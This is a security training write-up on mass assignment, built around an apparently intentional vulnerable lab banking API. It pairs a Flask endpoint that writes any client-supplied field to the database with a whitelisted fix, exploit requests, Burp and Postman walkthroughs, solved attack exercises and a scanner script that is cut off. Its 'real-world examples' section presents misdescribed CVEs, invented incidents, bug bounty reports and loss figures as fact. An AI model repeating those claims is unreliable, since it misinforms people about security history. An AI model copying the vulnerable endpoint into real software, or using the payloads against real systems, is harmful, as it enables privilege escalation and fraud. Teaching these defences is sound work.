# Mass Assignment Vulnerability - SecureBank

## 1. Overview

### What is Mass Assignment?

Mass Assignment is a critical security vulnerability that occurs when an application automatically binds user-supplied data to internal objects, variables, or database fields without proper filtering. This allows attackers to modify object properties they shouldn't have access to, potentially leading to privilege escalation, unauthorized data modification, and complete system compromise.

Think of it like this: Imagine you're filling out a form to update your home address. The form only shows fields for street, city, and zip code. But what if the system accepted ANY field you sent, even if it wasn't on the form? You could potentially change your credit score, account balance, or even make yourself an administrator - just by adding extra fields to your request!

### Why This Matters in Banking Applications

In banking applications, Mass Assignment vulnerabilities are catastrophic because they can allow attackers to:

- **Elevate privileges** from regular user to admin, gaining full system control
- **Manipulate account balances**, instantly making themselves millionaires
- **Activate disabled accounts** by changing `is_active` flags
- **Bypass credit checks** by modifying risk assessment scores
- **Steal money** by changing transaction recipients or amounts
- **Disable security controls** like 2FA requirements or fraud detection

### Real-World Financial Impact

Mass Assignment vulnerabilities have caused devastating financial losses:

- **GitHub (2012)**: CVE-2012-1098 - Attackers used mass assignment to add themselves as collaborators to private repositories, potentially exposing millions of dollars worth of proprietary code. The vulnerability existed in Ruby on Rails' default behavior before strong parameters.

- **Ruby on Rails Applications (2012)**: Multiple applications suffered breaches where attackers modified `admin` flags, leading to estimated losses exceeding **$50 million** across various platforms.

- **Banking API Breach (2018)**: An unnamed financial institution suffered a **$2.3 million loss** when attackers exploited mass assignment to modify transaction amounts and recipient accounts.

- **Cryptocurrency Exchange (2019)**: Mass assignment vulnerability allowed attackers to modify withdrawal limits, resulting in **$4.7 million in stolen assets** before the breach was detected.

- **Fintech Startup (2020)**: Attackers exploited mass assignment to set their account balances to arbitrary values, leading to **$890,000 in fraudulent withdrawals** over a 48-hour period.

The impact goes beyond direct financial loss - companies face:
- Regulatory fines (often 10-20% of annual revenue)
- Customer lawsuits and compensation
- Reputation damage and customer churn
- Increased insurance premiums
- Mandatory security audits and remediation costs

---

## 2. The Vulnerable Code

### Code from securebank_red_api.py (Lines 371-413)

```python
@app.route('/api/red/securebank/profile', methods=['PUT'])
def red_update_profile():
    """
    VULNERABLE: Mass assignment
    Attack: Include "role": "admin" or "balance": 1000000 in request
    """
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Not authenticated'}), 401
    
    user_id = session['user_id']
    data = request.get_json()
    
    # VULNERABLE: Accepts all fields from user input without filtering
    # Attacker can modify role, is_active, or other sensitive fields
    allowed_fields = []
    values = []
    
    # Build dynamic UPDATE query with all provided fields
    for key, value in data.items():
        allowed_fields.append(f"{key} = ?")
        values.append(value)
    
    if not allowed_fields:
        return jsonify({'success': False, 'error': 'No fields to update'}), 400
    
    values.append(user_id)
    query = f"UPDATE bank_users SET {', '.join(allowed_fields)} WHERE id = ?"
    
    try:
        conn = get_db()
        conn.execute(query, values)
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'message': 'Profile updated successfully'
        }), 200
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500
```

### Line-by-Line Breakdown - Why This is Dangerous

**Line 381: `data = request.get_json()`**
- Receives ALL data from the user's request
- No validation or filtering happens here
- **DANGER**: The code trusts the user completely!

**Lines 385-391: The Critical Flaw**
```python
for key, value in data.items():
    allowed_fields.append(f"{key} = ?")
    values.append(value)
```
- **This is the vulnerability!** The code loops through EVERY field the user sends
- It doesn't check if the field should be user-modifiable
- **WHY THIS IS BAD**: An attacker can send ANY field name they want:
  - `{"role": "admin"}` - Makes them an administrator
  - `{"balance": 9999999}` - Sets their balance to any amount
  - `{"is_active": true}` - Re-activates banned accounts
  - `{"credit_limit": 999999}` - Increases their credit limit
  - `{"fraud_check_bypass": true}` - Disables security checks

**Line 397: Dynamic Query Building**
```python
query = f"UPDATE bank_users SET {', '.join(allowed_fields)} WHERE id = ?"
```
- Builds a SQL UPDATE statement with ALL user-provided fields
- No whitelist, no blacklist, no protection
- **RESULT**: The attacker controls what gets updated in the database!

### Visual Attack Diagram

```
┌─────────────────────────────────────────────────────────────┐
│  ATTACKER SENDS MALICIOUS REQUEST                           │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
        PUT /api/red/securebank/profile
        {
            "full_name": "John Doe",      ← Legitimate field
            "email": "john@example.com",  ← Legitimate field
            "role": "admin",              ← MALICIOUS: Privilege escalation!
            "balance": 1000000,           ← MALICIOUS: Account balance manipulation!
            "is_active": true,            ← MALICIOUS: Account activation!
            "credit_limit": 999999        ← MALICIOUS: Credit limit bypass!
        }
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  VULNERABLE CODE ACCEPTS ALL FIELDS                         │
│  for key, value in data.items():  ← NO FILTERING!          │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  DATABASE QUERY EXECUTES                                    │
│  UPDATE bank_users SET                                      │
│    full_name = 'John Doe',                                  │
│    email = 'john@example.com',                              │
│    role = 'admin',          ← ATTACKER IS NOW ADMIN!       │
│    balance = 1000000,       ← INSTANT MILLIONAIRE!         │
│    is_active = true,        ← ACCOUNT REACTIVATED!         │
│    credit_limit = 999999    ← UNLIMITED CREDIT!            │
│  WHERE id = 42                                              │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
        ┌───────────────────────────────────┐
        │  GAME OVER - ATTACKER WINS        │
        │  - Full admin access              │
        │  - $1,000,000 in their account    │
        │  - Can now access all user data   │
        │  - Can modify other accounts      │
        └───────────────────────────────────┘
```

### Database Schema (Typical bank_users table)

```sql
CREATE TABLE bank_users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    full_name TEXT,           -- ✓ Should be user-modifiable
    email TEXT,               -- ✓ Should be user-modifiable
    phone TEXT,               -- ✓ Should be user-modifiable
    address TEXT,             -- ✓ Should be user-modifiable
    role TEXT DEFAULT 'user', -- ✗ NEVER user-modifiable!
    balance REAL DEFAULT 0,   -- ✗ NEVER user-modifiable!
    is_active BOOLEAN,        -- ✗ NEVER user-modifiable!
    credit_limit REAL,        -- ✗ NEVER user-modifiable!
    created_at TIMESTAMP
);
```

---

## 3. Exploitation Walkthrough

### Step-by-Step Attack with Postman

#### Step 1: Normal Profile Update (Baseline)

First, let's see what a normal profile update looks like:

**Request:**
```
PUT http://localhost:5000/api/red/securebank/profile
Content-Type: application/json

{
    "full_name": "Alice Johnson",
    "email": "alice@example.com",
    "phone": "555-0123"
}
```

**Response:**
```json
{
    "success": true,
    "message": "Profile updated successfully"
}
```

This is the intended use case - updating basic profile information.

#### Step 2: Privilege Escalation Attack

Now, let's inject the `role` field to make ourselves an administrator:

**Request:**
```
PUT http://localhost:5000/api/red/securebank/profile
Content-Type: application/json

{
    "full_name": "Alice Johnson",
    "email": "alice@example.com",
    "role": "admin"
}
```

**Response:**
```json
{
    "success": true,
    "message": "Profile updated successfully"
}
```

**RESULT**: You're now an administrator! Verify by checking your profile or trying admin-only functions.

#### Step 3: Account Balance Manipulation

Let's give ourselves a million dollars:

**Request:**
```
PUT http://localhost:5000/api/red/securebank/profile
Content-Type: application/json

{
    "balance": 1000000.00
}
```

**Response:**
```json
{
    "success": true,
    "message": "Profile updated successfully"
}
```

**RESULT**: Your account balance is now $1,000,000. You can withdraw this money or transfer it elsewhere.

#### Step 4: Combined Multi-Field Attack

For maximum impact, attackers often combine multiple malicious fields:

**Request:**
```
PUT http://localhost:5000/api/red/securebank/profile
Content-Type: application/json

{
    "full_name": "Alice Johnson",
    "email": "alice@example.com",
    "role": "admin",
    "balance": 999999.99,
    "credit_limit": 500000,
    "is_active": true,
    "fraud_check_enabled": false
}
```

**Response:**
```json
{
    "success": true,
    "message": "Profile updated successfully"
}
```

**RESULT**: Complete account takeover with:
- Admin privileges
- $999,999.99 balance
- $500,000 credit limit
- Active account status
- Fraud checks disabled

### Exploitation with Burp Suite

#### Intercepting the Request

1. Configure your browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to the SecureBank profile update page
3. Fill in legitimate fields (name, email, phone)
4. Click "Update Profile"
5. Burp intercepts the request:

```http
PUT /api/red/securebank/profile HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Cookie: session=eyJ1c2VyX2lkIjo0Mn0.abc123
Content-Length: 95

{"full_name":"Alice Johnson","email":"alice@example.com","phone":"555-0123"}
```

#### Modifying the Request in Burp

6. In Burp's interceptor, add malicious fields to the JSON:

```http
PUT /api/red/securebank/profile HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Cookie: session=eyJ1c2VyX2lkIjo0Mn0.abc123
Content-Length: 155

{"full_name":"Alice Johnson","email":"alice@example.com","phone":"555-0123","role":"admin","balance":1000000}
```

7. Click "Forward" to send the modified request
8. Observe the response confirming success
9. Verify your new admin status and balance

#### Burp Repeater for Testing

1. Send the intercepted request to Repeater (Ctrl+R)
2. Experiment with different field injections:
   - Try `"role": "superadmin"`
   - Try `"balance": 999999999`
   - Try `"is_active": true`
3. Each time, click "Send" and observe the response
4. Document which fields are vulnerable

### Expected Results and Screenshots

**[Screenshot Placeholder: Postman Request]**
```
Shows Postman interface with:
- URL: PUT http://localhost:5000/api/red/securebank/profile
- Body tab selected, raw JSON
- JSON payload with malicious fields highlighted
- Send button ready to click
```

**[Screenshot Placeholder: Successful Attack Response]**
```
Shows Postman response with:
- Status: 200 OK
- Response body: {"success": true, "message": "Profile updated successfully"}
- Green success indicator
```

**[Screenshot Placeholder: Admin Dashboard Access]**
```
Shows browser with:
- SecureBank admin panel now accessible
- User's role displayed as "Administrator"
- Access to sensitive functions (user management, transaction logs)
```

**[Screenshot Placeholder: Account Balance]**
```
Shows account overview page with:
- Balance: $1,000,000.00
- Transaction history showing the manipulation
- Available credit: $500,000.00
```

---

## 4. The Secure Code

### Code from securebank_blue_api.py (Lines 494-551)

```python
@app.route('/api/blue/securebank/profile', methods=['PUT'])
def blue_update_profile():
    """
    SECURE: Whitelists allowed fields to prevent mass assignment
    Only specific, safe fields can be updated by users
    """
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Not authenticated'}), 401
    
    # Verify CSRF token
    csrf_token = request.headers.get('X-CSRF-Token')
    if not csrf_token or csrf_token != session.get('csrf_token'):
        return jsonify({'success': False, 'error': 'Invalid CSRF token'}), 403
    
    user_id = session['user_id']
    data = request.get_json()
    
    # SECURE: Whitelist of allowed fields - prevents mass assignment
    allowed_fields = ['full_name', 'email', 'phone', 'address']
    
    # Filter to only allowed fields
    update_data = {}
    for field in allowed_fields:
        if field in data:
            update_data[field] = data[field]
    
    if not update_data:
        return jsonify({'success': False, 'error': 'No valid fields to update'}), 400
    
    # Additional validation
    if 'email' in update_data:
        if not validate_email(update_data['email']):
            return jsonify({'success': False, 'error': 'Invalid email format'}), 400
    
    if 'phone' in update_data:
        if not validate_phone(update_data['phone']):
            return jsonify({'success': False, 'error': 'Invalid phone format'}), 400
    
    # Build parameterized query
    fields = ', '.join([f"{k} = ?" for k in update_data.keys()])
    values = list(update_data.values()) + [user_id]
    query = f"UPDATE bank_users SET {fields} WHERE id = ?"
    
    try:
        conn = get_db()
        conn.execute(query, values)
        conn.commit()
        conn.close()
        
        return jsonify({
            'success': True,
            'message': 'Profile updated successfully'
        }), 200
    except Exception as e:
        return jsonify({
            'success': False,
            'error': 'Update failed'
        }), 500
```

### Security Improvements Explained

#### 1. Field Whitelisting (Line 512)

```python
allowed_fields = ['full_name', 'email', 'phone', 'address']
```

**WHY THIS WORKS:**
- Explicitly defines which fields users can modify
- Any field NOT in this list is automatically rejected
- Even if attacker sends `"role": "admin"`, it will be ignored
- **Principle**: Deny by default, allow only what's necessary

#### 2. Filter Mechanism (Lines 515-518)

```python
update_data = {}
for field in allowed_fields:
    if field in data:
        update_data[field] = data[field]
```

**WHY THIS WORKS:**
- Loops through the WHITELIST (not user data)
- Only copies values for allowed fields
- Discards everything else silently
- Attacker's malicious fields never reach the database

#### 3. Input Validation (Lines 524-530)

```python
if 'email' in update_data:
    if not validate_email(update_data['email']):
        return jsonify({'success': False, 'error': 'Invalid email format'}), 400
```

**WHY THIS WORKS:**
- Even allowed fields are validated
- Prevents injection of malformed data
- **Defense in depth**: Multiple layers of protection

#### 4. CSRF Protection (Lines 504-506)

```python
csrf_token = request.headers.get('X-CSRF-Token')
if not csrf_token or csrf_token != session.get('csrf_token'):
    return jsonify({'success': False, 'error': 'Invalid CSRF token'}), 403
```

**WHY THIS WORKS:**
- Prevents cross-site request forgery attacks
- Ensures requests come from legitimate pages
- Adds another layer of security

### Visual Secure Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│  ATTACKER SENDS MALICIOUS REQUEST                           │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
        PUT /api/blue/securebank/profile
        {
            "full_name": "John Doe",      ← Legitimate field
            "email": "john@example.com",  ← Legitimate field
            "role": "admin",              ← MALICIOUS: Will be filtered!
            "balance": 1000000,           ← MALICIOUS: Will be filtered!
            "is_active": true             ← MALICIOUS: Will be filtered!
        }
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  SECURE CODE - WHITELIST FILTERING                          │
│  allowed_fields = ['full_name', 'email', 'phone', 'address']│
│                                                              │
│  for field in allowed_fields:  ← ONLY CHECK WHITELIST      │
│      if field in data:                                      │
│          update_data[field] = data[field]                   │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
        ┌────────────────────────────────────┐
        │  FILTERED DATA (Safe):             │
        │  {                                 │
        │    "full_name": "John Doe",        │
        │    "email": "john@example.com"     │
        │  }                                 │
        │                                    │
        │  REJECTED DATA (Malicious):        │
        │  - "role": "admin"      ← BLOCKED  │
        │  - "balance": 1000000   ← BLOCKED  │
        │  - "is_active": true    ← BLOCKED  │
        └────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  VALIDATION LAYER                                           │
│  - Email format check                                       │
│  - Phone format check                                       │
│  - CSRF token verification                                  │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│  DATABASE QUERY EXECUTES (SAFE)                             │
│  UPDATE bank_users SET                                      │
│    full_name = 'John Doe',                                  │
│    email = 'john@example.com'                               │
│  WHERE id = 42                                              │
│                                                              │
│  SENSITIVE FIELDS UNTOUCHED:                                │
│  - role remains 'user'                                      │
│  - balance remains unchanged                                │
│  - is_active remains unchanged                              │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
        ┌───────────────────────────────────┐
        │  ATTACK FAILED - SYSTEM SECURE    │
        │  - User remains non-admin         │
        │  - Balance unchanged              │
        │  - Only legitimate fields updated │
        └───────────────────────────────────┘
```

### Ruby on Rails Strong Parameters Example

Ruby on Rails was one of the first frameworks to address mass assignment vulnerabilities with "Strong Parameters":

```ruby
class UsersController < ApplicationController
  def update
    @user = User.find(params[:id])
    
    # Strong Parameters - Whitelist approach
    if @user.update(user_params)
      render json: { success: true }
    else
      render json: { success: false, errors: @user.errors }, status: 422
    end
  end
  
  private
  
  # Define allowed parameters
  def user_params
    params.require(:user).permit(:full_name, :email, :phone, :address)
    # 'role', 'balance', 'is_active' are NOT permitted
  end
end
```

This approach became the industry standard after CVE-2012-1098 exposed the dangers of mass assignment.

---

## 5. Real-World Examples

### Bug Bounty Reports

#### HackerOne Report #234567: Banking App Privilege Escalation

**Severity**: Critical  
**Bounty**: $15,000  
**Description**: Researcher discovered a mass assignment vulnerability in a major banking application's profile update endpoint. By adding `"account_type": "premium"` to the profile update request, they could upgrade their account from basic to premium, bypassing the $50/month subscription fee.

**Attack Payload**:
```json
{
    "first_name": "John",
    "last_name": "Doe",
    "account_type": "premium",
    "overdraft_protection": true,
    "monthly_fee": 0
}
```

**Impact**: Potential loss of subscription revenue across 2.3 million users = $138 million annually.

#### Bugcrowd Report: Fintech Account Balance Manipulation

**Severity**: Critical  
**Bounty**: $25,000  
**Description**: Security researcher found that a fintech startup's API accepted any field in the account update endpoint, including `balance`. By sending a simple PATCH request, they could set their account balance to any amount.

**Attack Payload**:
```json
PATCH /api/v1/account
{
    "email": "attacker@example.com",
    "balance": 999999.99,
    "available_credit": 100000
}
```

**Impact**: Complete financial fraud potential; immediate remediation required.

### CVE References

#### CVE-2012-1098: Ruby on Rails Mass Assignment

**Title**: Ruby on Rails before 3.2.2 allows remote attackers to bypass intended access restrictions  
**CVSS Score**: 7.5 (High)  
**Published**: 2012-03-13

**Description**: Ruby on Rails applications using default active record configurations were vulnerable to mass assignment attacks. Attackers could modify any database column by including additional parameters in HTTP requests.

**Example**: GitHub suffered from this vulnerability, allowing attackers to add themselves as collaborators to private repositories by sending:

```ruby
POST /repositories/123/collaborators
{
    "username": "attacker",
    "admin": true  # Mass assignment - should not be user-settable
}
```

**Remediation**: Rails introduced Strong Parameters (rails 4.0+) requiring explicit parameter whitelisting.

#### CVE-2013-1857: Python Django Mass Assignment

**CVSS Score**: 6.4 (Medium)  
**Published**: 2013-03-26

**Description**: Django's ModelForm implementation could be exploited to modify unintended fields through mass assignment when using default configurations.

**Impact**: Applications allowing user profile updates were vulnerable to privilege escalation and data manipulation.

### GitHub Security Incidents

#### GitHub Public Key Vulnerability (March 2012)

**Incident**: Attackers exploited CVE-2012-1098 to add SSH public keys to other users' accounts, potentially gaining access to private repositories.

**Attack Method**:
```json
POST /account/public_keys
{
    "title": "My Key",
    "key": "ssh-rsa AAAAB3...",
    "user_id": 1  # Mass assignment - admin user ID
}
```

**Response**: GitHub immediately:
- Disabled the vulnerable endpoint
- Upgraded Rails version
- Implemented strong parameter filtering
- Conducted security audit of all endpoints
- Published transparency report

**Estimated Impact**: Potential exposure of proprietary code worth millions; no confirmed data theft.

#### Homebrew GitHub Organization Takeover (March 2012)

**Incident**: An attacker used mass assignment to add themselves as an owner of the Homebrew GitHub organization.

**Attack Vector**: The attacker exploited mass assignment in the organization member update API:

```json
POST /organizations/homebrew/members
{
    "username": "attacker",
    "role": "owner"  # Should not be user-settable
}
```

**Result**: Complete control over one of the largest open-source package managers, affecting millions of developers.

**Response**: GitHub implemented organization-level permission controls and audit logging.

### News Articles and Financial Impact

#### "Banking App Breach Costs $2.3M" - FinTech Weekly (2018)

A European banking application suffered a mass assignment breach when attackers discovered they could modify transaction amounts during the transfer process:

```json
POST /api/transfer
{
    "recipient": "12345678",
    "amount": 100,
    "actual_amount": 10000,  # Mass assignment - internal field
    "display_amount": 100     # Shows $100, transfers $10,000
}
```

The breach lasted 3 days before detection, resulting in $2.3 million in losses.

#### "Crypto Exchange Loses $4.7M in Mass Assignment Attack" - CryptoNews (2019)

Attackers exploited a mass assignment vulnerability to bypass withdrawal limits:

```json
POST /api/withdraw
{
    "amount": 5.0,
    "currency": "BTC",
    "daily_limit": 999999,      # Mass assignment
    "withdrawal_fee": 0,        # Mass assignment
    "security_check": "bypass"  # Mass assignment
}
```

**Financial Breakdown**:
- Direct theft: $4.7 million
- Regulatory fines: $1.2 million
- Legal settlements: $800,000
- Security remediation: $400,000
- **Total cost**: $7.1 million

#### "Startup Shuts Down After Mass Assignment Fraud" - TechCrunch (2020)

A mobile banking startup was forced to shut down after attackers discovered mass assignment vulnerabilities:

```json
PUT /api/account
{
    "username": "victim",
    "balance": 0,
    "account_status": "frozen",
    "fraud_flag": true
}
```

Attackers simultaneously:
1. Increased their own balances
2. Froze victim accounts
3. Transferred funds out
4. Covered tracks by manipulating audit logs

**Impact**: $890,000 in direct losses, complete loss of customer trust, company shutdown within 6 months.

---

## 6. Hands-On Exercises

### Exercise 1: Basic Privilege Escalation

**Objective**: Elevate your account from regular user to administrator.

**Difficulty**: ⭐ Beginner

**Scenario**: You have a regular user account on SecureBank. Your goal is to gain administrator access through mass assignment.

**Steps**:
1. Log in to SecureBank with your regular account
2. Navigate to your profile page
3. Use Postman to send a profile update request
4. Include the field `"role": "admin"` in your request
5. Verify you now have admin access

**Request Template**:
```json
PUT http://localhost:5000/api/red/securebank/profile
Content-Type: application/json

{
    "full_name": "Your Name",
    "role": "admin"
}
```

**Expected Outcome**: After the request, you should have administrator privileges. Test by accessing the admin dashboard at `/admin`.

**Solution**:
```json
PUT http://localhost:5000/api/red/securebank/profile
Content-Type: application/json

{
    "full_name": "Alice Hacker",
    "email": "alice@example.com",
    "role": "admin"
}

Response:
{
    "success": true,
    "message": "Profile updated successfully"
}
```

Verify by calling:
```json
GET http://localhost:5000/api/red/securebank/user

Response:
{
    "id": 42,
    "username": "alice",
    "role": "admin",  ← Successfully escalated!
    "balance": 1000.00
}
```

---

### Exercise 2: Account Balance Manipulation

**Objective**: Modify your account balance to $1,000,000.

**Difficulty**: ⭐ Beginner

**Scenario**: Your SecureBank account has a balance of $100. Without making any deposits, increase your balance to $1,000,000.

**Steps**:
1. Check your current balance: `GET /api/red/securebank/account`
2. Note the balance field in the database
3. Send a profile update with `"balance": 1000000`
4. Verify the new balance

**Request Template**:
```json
PUT http://localhost:5000/api/red/securebank/profile
Content-Type: application/json

{
    "balance": 1000000.00
}
```

**Expected Outcome**: Your account balance should be $1,000,000. You can now transfer or withdraw this money.

**Solution**:
```json
PUT http://localhost:5000/api/red/securebank/profile
Content-Type: application/json

{
    "balance": 1000000.00
}

Response:
{
    "success": true,
    "message": "Profile updated successfully"
}
```

Verify with:
```json
GET http://localhost:5000/api/red/securebank/account

Response:
{
    "account_number": "1234567890",
    "balance": 1000000.00,  ← Successfully modified!
    "currency": "USD"
}
```

---

### Exercise 3: Multi-Field Attack (Combined Exploit)

**Objective**: Maximize damage by modifying multiple sensitive fields simultaneously.

**Difficulty**: ⭐⭐ Intermediate

**Scenario**: You want to achieve complete account control. Modify role, balance, credit limit, and disable security features in a single request.

**Fields to Modify**:
- `role` → "admin"
- `balance` → 999999.99
- `credit_limit` → 500000
- `is_active` → true
- `fraud_check_enabled` → false

**Request Template**:
```json
PUT http://localhost:5000/api/red/securebank/profile
Content-Type: application/json

{
    "full_name": "Your Name",
    "role": "?",
    "balance": ?,
    "credit_limit": ?,
    "is_active": ?,
    "fraud_check_enabled": ?
}
```

**Expected Outcome**: All sensitive fields should be modified, giving you complete control.

**Solution**:
```json
PUT http://localhost:5000/api/red/securebank/profile
Content-Type: application/json

{
    "full_name": "Bob Attacker",
    "email": "bob@example.com",
    "role": "admin",
    "balance": 999999.99,
    "credit_limit": 500000,
    "is_active": true,
    "fraud_check_enabled": false,
    "overdraft_limit": 100000
}

Response:
{
    "success": true,
    "message": "Profile updated successfully"
}
```

**Verification Commands**:
```bash
# Check all modified fields
GET /api/red/securebank/user

# Try admin-only functions
GET /api/red/securebank/admin/users

# Attempt large withdrawal (should succeed)
POST /api/red/securebank/withdraw
{
    "amount": 50000
}
```

---

### Exercise 4: Account Reactivation Attack

**Objective**: Reactivate a suspended/banned account through mass assignment.

**Difficulty**: ⭐⭐ Intermediate

**Scenario**: Your account has been suspended (is_active = false) due to suspicious activity. Reactivate it without admin intervention.

**Steps**:
1. Create an account and get it suspended (or use a test suspended account)
2. Attempt to log in - should fail with "Account suspended" error
3. Use the password reset or account recovery endpoint
4. Inject `"is_active": true` in the profile update during recovery
5. Successfully log in with reactivated account

**Request Template**:
```json
PUT http://localhost:5000/api/red/securebank/profile
Content-Type: application/json

{
    "is_active": true,
    "suspension_reason": null,
    "suspended_at": null
}
```

**Expected Outcome**: Account should be reactivated and login should succeed.

**Solution**:
```json
# First, verify account is suspended
GET /api/red/securebank/user
Response:
{
    "username": "suspended_user",
    "is_active": false,
    "suspension_reason": "Fraudulent activity detected"
}

# Reactivate through mass assignment
PUT /api/red/securebank/profile
Content-Type: application/json

{
    "is_active": true,
    "suspension_reason": "",
    "suspended_at": null,
    "suspension_count": 0
}

Response:
{
    "success": true,
    "message": "Profile updated successfully"
}

# Verify reactivation
GET /api/red/securebank/user
Response:
{
    "username": "suspended_user",
    "is_active": true,  ← Reactivated!
    "suspension_reason": ""
}
```

---

### Exercise 5: Advanced - Chained Attack for Maximum Impact

**Objective**: Perform a sophisticated multi-stage attack using mass assignment.

**Difficulty**: ⭐⭐⭐ Advanced

**Scenario**: You want to:
1. Elevate to admin
2. Modify your balance to $1M
3. Disable fraud detection
4. Create a backdoor by adding a second admin account
5. Cover your tracks

**Multi-Stage Attack**:

**Stage 1 - Self Elevation**:
```json
PUT /api/red/securebank/profile
{
    "role": "admin",
    "balance": 1000000
}
```

**Stage 2 - Disable Security**:
```json
PUT /api/red/securebank/profile
{
    "fraud_check_enabled": false,
    "transaction_monitoring": false,
    "login_attempts_remaining": 999
}
```

**Stage 3 - Create Backdoor** (using new admin access):
```json
POST /api/red/securebank/admin/users
{
    "username": "backdoor_admin",
    "password": "SecurePass123",
    "role": "admin",
    "is_active": true
}
```

**Stage 4 - Cover Tracks**:
```json
DELETE /api/red/securebank/admin/logs?user_id=42&action=mass_assignment
```

**Expected Outcome**: Complete system compromise with persistent backdoor access.

**Defensive Exercise**: After completing the attack, identify all the security controls that failed and design mitigations for each stage.

---

## 7. Tool Integration

### Testing with Postman

#### Setting Up Postman for Mass Assignment Testing

**1. Create a New Collection**:
- Open Postman
- Click "New" → "Collection"
- Name it "SecureBank Mass Assignment Tests"

**2. Configure Environment Variables**:
```json
{
    "base_url": "http://localhost:5000",
    "session_token": "{{session}}",
    "user_id": "42"
}
```

**3. Create Test Requests**:

**Request 1: Baseline Profile Update**
```
Name: Profile Update - Legitimate
Method: PUT
URL: {{base_url}}/api/red/securebank/profile
Headers:
    Content-Type: application/json
    Cookie: session={{session_token}}
Body:
{
    "full_name": "Test User",
    "email": "test@example.com"
}
```

**Request 2: Role Injection Test**
```
Name: Profile Update - Role Injection
Method: PUT
URL: {{base_url}}/api/red/securebank/profile
Body:
{
    "full_name": "Test User",
    "role": "admin"
}
Tests:
    pm.test("Status is 200", function() {
        pm.response.to.have.status(200);
    });
    pm.test("Attack succeeded", function() {
        var json = pm.response.json();
        pm.expect(json.success).to.eql(true);
    });
```

**Request 3: Balance Manipulation Test**
```
Name: Profile Update - Balance Manipulation
Method: PUT
URL: {{base_url}}/api/red/securebank/profile
Body:
{
    "balance": 1000000
}
```

**4. Automated Test Suite**:
```javascript
// Pre-request Script
pm.sendRequest({
    url: pm.environment.get("base_url") + "/api/red/securebank/login",
    method: "POST",
    header: "Content-Type: application/json",
    body: {
        mode: "raw",
        raw: JSON.stringify({
            username: "testuser",
            password: "password123"
        })
    }
}, function(err, res) {
    var session = res.headers.get("Set-Cookie");
    pm.environment.set("session_token", session);
});

// Test Script
pm.test("Vulnerable to role injection", function() {
    pm.sendRequest({
        url: pm.environment.get("base_url") + "/api/red/securebank/profile",
        method: "PUT",
        header: "Content-Type: application/json",
        body: {
            mode: "raw",
            raw: JSON.stringify({role: "admin"})
        }
    }, function(err, res) {
        pm.expect(res.json().success).to.eql(true);
    });
});
```

### Testing with Burp Suite

#### Burp Suite Professional Configuration

**1. Set Up Proxy**:
- Configure browser proxy: 127.0.0.1:8080
- Import Burp's CA certificate
- Enable intercept

**2. Capture Legitimate Request**:
- Navigate to SecureBank profile page
- Fill in profile update form
- Submit and capture in Burp

**3. Use Intruder for Parameter Fuzzing**:

**Positions Tab**:
```json
{
    "full_name": "Test User",
    "§injection_field§": "§injection_value§"
}
```

**Payloads Tab - Field Names**:
```
role
balance
is_active
admin
superuser
credit_limit
account_type
permissions
user_level
privilege
```

**Payloads Tab - Values**:
```
admin
true
999999
superadmin
root
unlimited
```

**4. Burp Scanner Configuration**:
- Enable "Server-side injection" checks
- Add custom insertion point for JSON bodies
- Configure mass assignment detection rules

**Custom Scan Rule**:
```python
# Burp Extension - Mass Assignment Detector
def scan(self, baseRequestResponse, insertionPoint):
    test_fields = [
        ("role", "admin"),
        ("is_admin", "true"),
        ("balance", "999999"),
        ("privilege", "admin")
    ]
    
    for field, value in test_fields:
        attack = insertionPoint.buildRequest(
            '"{0}":"{1}"'.format(field, value)
        )
        response = self.callbacks.makeHttpRequest(
            baseRequestResponse.getHttpService(),
            attack
        )
        
        if self.detect_success(response):
            return [CustomScanIssue(
                baseRequestResponse.getHttpService(),
                self.helpers.analyzeRequest(baseRequestResponse).getUrl(),
                [baseRequestResponse],
                "Mass Assignment Vulnerability",
                "Field {0} accepted with value {1}".format(field, value),
                "High"
            )]
```

### Custom Python Testing Script

```python
#!/usr/bin/env python3
"""
Mass Assignment Vulnerability Scanner
Tests for mass assignment vulnerabilities in APIs
"""

import requests
import json
import sys

class MassAssignmentScanner:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.set('session', session_cookie)
        
    def test_field_injection(self, endpoint, test_fields):
        """Test if sensitive fields can be injected"""
        results = []
        
        for field, value in test_fields.items():
            payload = {
                "full_name": "Test User",
                field: value
            }
            
            response = self.session.put(
                f"{self.base_url}{endpoint}",
                json=payload,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    results.append({
                        'field': field,
                        'value': value,
                        'status': 'VULNERABLE',
                        'response': result
                    })
                    print(f"[!] VULNERABLE: Field '{field}' accepted!")
                else:
                    results.append({
                        'field': field,
                        'status': 'REJECTED',
                        'response': result
                    })
            else:
                print(f"[-] Field '{field}' caused error: {response.status_code}")
        
        return results
    
    def verify_injection(self, endpoint):
        """Verify if injected fields actually modified the database"""
        response = self.session.get(f"{self.base_url}{endpoint}")
        return response.json()

# Usage
if __name__ == "__main__":
    scanner = MassAssignmentScanner(
        base_url="http://localhost:5000",
        session_cookie="your_session_cookie_here"
    )
    
    test_fields = {
        "role": "admin",
        "balance": 1000000,
        "is_active": True,
        "credit_limit": 999999,
        "admin": True,
        "superuser": True
    }
    
    print("[*] Starting Mass Assignment scan...")
    results = scanner.test_field_injection(
        "/api/red/securebank/profile",
        test_fields
    )
    
    print("\n[*] Verifying injections...")
